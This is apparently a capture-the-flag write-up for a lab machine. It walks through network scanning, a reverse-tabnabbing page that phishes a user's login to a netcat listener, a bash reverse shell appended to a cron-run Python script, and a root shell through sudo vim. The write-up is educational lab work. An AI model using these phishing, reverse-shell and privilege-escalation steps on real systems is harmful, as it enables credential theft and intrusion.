## Information Gathering
### Host Discovery

The following ARP scan discovered the target host.

```console
root@kali:~# arp-scan -I vmnet1 172.16.178.0/24
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 172.16.178.1
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.178.137  08:00:27:49:ee:4d       PCS Systemtechnik GmbH
172.16.178.254  00:50:56:e7:39:79       VMware, Inc.
```

### Port Scanning

A full TCP port scan with nmap detected two open ports.

```console
root@kali:~# nmap -n -v -p1-65535 -T4 -Pn 172.16.178.137 -oG nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

With the aim to obtain more information about the open ports, script scanning and version detection was performed against the open ports.

```console
root@kali:~# nmap -n -v -sC -sV -Pn -p22,80 172.16.178.137 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Web Enumeration

Browsing the web page I was greeted with a login page.

![](/assets/images/thales/screenshot-1.png)

I created an account to log in to the web application.

![](/assets/images/thales/screenshot-2.png)

Then I logged in to the web application with the account created earlier.


![](/assets/images/thales/screenshot-3.png)

I had access to a promotions site, it requires the user to enter a blog link.

![](/assets/images/thales/screenshot-4.png)

To test this, I created a simple HTML script, and hosted it in my web root.

```html
<html>
    <head>
    </head>
    <body>
        <h2>My test page</h2>
    </body>
</html>
```

I started the apache service.

```console
root@kali:~# systemctl start apache2
```

I entered the link containing my test script in the **Blog Link** field, and clicked submit.

![](/assets/images/thales/screenshot-5.png)

After submitted the URL, I inspected the source code and found the **target='_blank'** attribute, which is vulnerable to reverse tabnabbing.

![](/assets/images/thales/screenshot-6.png)

I monitored the apache logs and a few minutes later I noticed that the target server was connecting to my HTML script.

```console
root@kali:~# tail -f /var/log/apache2/access.log
172.16.178.1 - - [26/Sep/2022:22:10:17 -0500] "GET /test.html HTTP/1.1" 200 406 "http://172.16.178.137/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
172.16.178.137 - - [26/Sep/2022:22:12:06 -0500] "GET /test.html HTTP/1.1" 200 406 "-" "python-requests/2.22.0"
172.16.178.137 - - [26/Sep/2022:22:14:06 -0500] "GET /test.html HTTP/1.1" 200 406 "-" "python-requests/2.22.0"
```

## Exploitation
### Reverse tabnabbing

I created the following HTML script that simulates a phishing page.

```html
<html>
    <head>
    </head>
    <body>
        <h2>My test page</h2>
        <script>
            window.opener.location = "http://172.16.178.1:8080";
        </script>
    </body>
</html>
```

I sent the URL of the phishing page.

![](/assets/images/thales/screenshot-7.png)

I started a netcat listener on port 8080, after a minutes I got the credentials.

```console
root@kali:/var/www/html# nc -vlnp 8080
listening on [any] 8080 ...
connect to [172.16.178.1] from (UNKNOWN) [172.16.178.137] 51010
POST / HTTP/1.1
Host: 172.16.178.1:8080
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

username=daniel&password=C%40ughtm3napping123
```

The password is in URL encoded, so I decoded it.

```console
root@kali:~# hURL -u "C%40ughtm3napping123"

Original    :: C%40ughtm3napping123
URL DEcoded :: C@ughtm3napping123
```

I logged in via ssh with the credentials found.

```console
root@kali:~# ssh -l daniel 172.16.178.137
```

I found a python script that executes as a cron job in adrianâ€™s home directory, it is locally checking the webpage.

```console
daniel@napping:/home/adrian$ cat query.py
cat query.py
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

I noticed that this script belongs to the **administrators** group, user daniel belongs to that group, so I can edit this file.

```console
daniel@napping:/home/adrian$ ls -l
total 12
-rw-rw-r-- 1 adrian administrators  481 Oct 30  2021 query.py
-rw-rw-r-- 1 adrian adrian         2208 Sep 27 03:54 site_status.txt
-rw------- 1 adrian adrian           22 Oct 12  2021 user.txt
```

## Privilege Escalation
### Cron Job

I typed the following commands to append python instructions to **query.py** script, which executes a bash reverse shell.

```console
daniel@napping:/home/adrian$ echo "import os" >> query.py
daniel@napping:/home/adrian$ echo "os.system(\"bash -c 'bash -i >& /dev/tcp/172.16.178.1/443 0>&1'\")" >> query.py
```

I waited a few minutes and got a shell with adrian user privileges.

```console
root@kali:/var/www/html# nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.178.1] from (UNKNOWN) [172.16.178.137] 45748
bash: cannot set terminal process group (3594): Inappropriate ioctl for device
bash: no job control in this shell
adrian@napping:~$ script -qc /bin/bash /dev/null
script -qc /bin/bash /dev/null
adrian@napping:~$ id
id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),1002(administrators)
```

I found the first flag in Adrian's home directory.

```console
adrian@napping:~$cat user.txt
cat user.txt
You are nearly there!
```

### Sudo Permissions

Listing the sudo permissions, I found that user **adrian** can execute vim as sudo without password.

```console
adrian@napping:~$ sudo -l
sudo -l
Matching Defaults entries for adrian on napping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on napping:
    (root) NOPASSWD: /usr/bin/vim
```

I executed the following command to get root, as you see now is possible to read the root flag.

```console
adrian@napping:~$ sudo vim -c ':!/bin/bash'


:!/bin/bash
root@napping:/home/adrian# cd
cd
root@napping:~# cat root.txt
cat root.txt
Admins just can't stay awake tsk tsk tsk
```
